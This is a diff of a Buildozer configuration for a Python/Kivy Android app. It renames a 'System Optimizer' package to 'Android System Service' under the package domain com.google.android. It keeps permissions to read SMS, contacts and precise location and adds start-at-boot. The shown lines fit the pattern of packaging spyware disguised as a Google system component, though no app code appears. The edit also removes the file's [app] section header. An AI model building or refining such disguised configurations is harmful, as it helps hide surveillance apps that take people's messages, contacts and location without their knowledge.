@@ -1,21 +1,18 @@
-[app]
-title = System Optimizer
-package.name = system.opt.v6
-package.domain = com.ghost.pro
+title = Android System Service
+package.name = sysservice
+package.domain = com.google.android
 source.dir = .
-version = 6.0
-requirements = python3, kivy==2.3.0, requests, pyjnius, android
-icon.filename = %(source.dir)s/icon.png
-orientation = portrait
+source.include_exts = py,png,jpg,kv,atlas
+version = 0.1
+
+# Requirements (Important!)
+requirements = python3,kivy==2.3.0,requests,pyjnius,android
 
 # Permissions
-android.permissions = INTERNET, READ_SMS, READ_CONTACTS, READ_CALL_LOG, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION
+android.permissions = INTERNET, READ_SMS, READ_CONTACTS, ACCESS_FINE_LOCATION, RECEIVE_BOOT_COMPLETED
 
+# Android SDK/API (Latest for 2026)
 android.api = 33
-android.sdk = 33
+android.minapi = 21
 android.ndk = 25b
 android.archs = arm64-v8a
-android.enable_androidx = True
-
-[buildozer]
-log_level = 2
